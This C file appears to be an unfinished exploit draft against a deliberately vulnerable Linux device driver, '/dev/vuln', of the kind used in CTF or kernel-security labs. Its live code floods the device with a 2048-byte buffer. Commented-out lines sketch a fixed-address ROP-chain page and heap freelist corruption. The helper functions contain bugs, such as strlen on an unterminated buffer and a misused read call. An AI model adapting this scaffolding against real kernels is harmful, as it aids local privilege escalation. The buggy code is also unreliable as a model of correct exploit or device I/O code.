#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define PAGE_SIZE 4096

int fd;

void open_dev(){
	fd = open("/dev/vuln", O_RDWR);
	if(fd < 0){
		puts("[!] Error opening device");
		exit(-1);
	}
	puts("[*] Opened device");
}

void dev_write(char* buf){
	int n = strlen(buf);
	printf("[*] Writing %d bytes\n", n);
	if(write(fd, buf, n)<0) {
		puts("[!] Error writing to device");
		exit(-1);
	}
	puts("[*] Wrote to device");
}

char* dev_read(char* buf) {
	char* output = (char*)read(fd, buf, sizeof(buf));
	if (output <= 0){
		puts("[!] Error reading from device");
		exit(-1);
	}
	puts("[*] Read from device");
	return output;
}

int main() {
	open_dev();
	/*unsigned long* rop_chain = (unsigned long*)
				mmap((void*)0xdeed000, PAGE_SIZE,
				PROT_READ|PROT_WRITE,
				MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
			       	-1, 0);
	*/
	char nothin[PAGE_SIZE/2];
	memset(nothin, 'a', PAGE_SIZE/2);
	/*memcpy(rop_chain, nothin, PAGE_SIZE);
	unsigned long evil[16];
	// freelist moved to middle
	memset(evil, 'a', sizeof(evil));
	evil[15] = rop_chain;*/
	dev_write(nothin);
}
